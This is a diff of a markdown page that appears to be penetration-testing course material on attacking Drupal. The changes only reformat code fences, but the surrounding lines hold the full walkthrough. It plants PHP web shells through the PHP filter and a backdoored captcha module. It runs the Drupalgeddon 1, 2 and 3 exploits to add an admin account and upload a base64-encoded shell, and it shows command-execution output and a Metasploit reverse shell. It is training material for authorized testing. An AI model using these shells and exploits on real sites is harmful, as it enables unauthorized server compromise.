@@ -26,8 +26,7 @@ We can now create a page with a malicious PHP snippet such as the one below. We 
 
 The `MD5` hash representation can originate from any hashed command or string that isn't easily guessable and is not present in any dictionary wordlists used for directory brute-forcing.
 
-```
-        php
+```php
 <?php
 system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 ?>
@@ -39,8 +38,7 @@ http://drupal-qa.inlanefreight.local/#overlay=node/add/page
 
 We also want to make sure to set `Text format` drop-down to `PHP code`. After clicking save, we will be redirected to the new page, in this example `http://drupal-qa.inlanefreight.local/node/3`. Once saved, we can either request execute commands in the browser by appending `?dcfdd5e021a869fcc6dfaef8bf31377e=id` to the end of the URL to run the `id` command or use `cURL` on the command line. From here, we could use a bash one-liner to obtain reverse shell access.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -48,8 +46,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 ```
 
@@ -75,16 +72,14 @@ Drupal allows users with appropriate permissions to upload a new module. A backd
 
 Download the archive and extract its contents.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
 hiimeins@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
 ```
 
 Create a PHP web shell with the contents:
 
-```
-        php
+```php
 <?php
 system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
 ?>
@@ -92,8 +87,7 @@ system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
 
 Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
 
-```
-        html
+```html
 <IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteBase /
@@ -102,8 +96,7 @@ RewriteBase /
 
 The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ mv shell.php .htaccess captcha
 hiimeins@htb[/htb]$ tar cvf captcha.tar.gz captcha/
 
@@ -126,8 +119,7 @@ http://drupal.inlanefreight.local/core/authorize.php
 
 Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -153,8 +145,7 @@ As stated previously, this flaw can be exploited by leveraging a pre-authenticat
 
 Running the script with the `-h` flag shows us the help menu.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python2.7 drupalgeddon.py 
 
   ______                          __     _______  _______ _____    
@@ -207,8 +198,7 @@ Options:
 
 Here we see that we need to supply the target URL and a username and password for our new admin account. Let's run the script and see if we get a new admin user.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
 
 <SNIP>
@@ -236,8 +226,7 @@ We could also use the [exploit/multi/http/drupal\_drupageddon](https://www.rapid
 
 We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 drupalgeddon2.py 
 
 ################################################################
@@ -255,8 +244,7 @@ Check: http://drupal-dev.inlanefreight.local/hello.txt
 
 We can check quickly with `cURL` and see that the `hello.txt` file was indeed uploaded.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
 
 ;-)
@@ -264,13 +252,11 @@ hiimeins@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
 
 Now let's modify the script to gain remote code execution by uploading a malicious PHP file.
 
-```
-        php
+```php
 <?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
 
 PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
@@ -278,15 +264,13 @@ PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
 
 Next, let's replace the `echo` command in the exploit script with a command to write out our malicious PHP script.
 
-```
-        shellsession
+```shellsession
  echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
 ```
 
 Next, run the modified exploit script to upload our malicious PHP file.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 drupalgeddon2.py 
 
 ################################################################
@@ -304,8 +288,7 @@ Check: http://drupal-dev.inlanefreight.local/mrb3n.php
 
 Finally, we can confirm remote code execution using `cURL`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -321,8 +304,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 Once we have the session cookie, we can set up the exploit module as follows.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
 msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
 msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
@@ -359,8 +341,7 @@ Exploit target:
 
 If successful, we will obtain a reverse shell on the target host.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(multi/http/drupal_drupageddon3) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.15:4444 
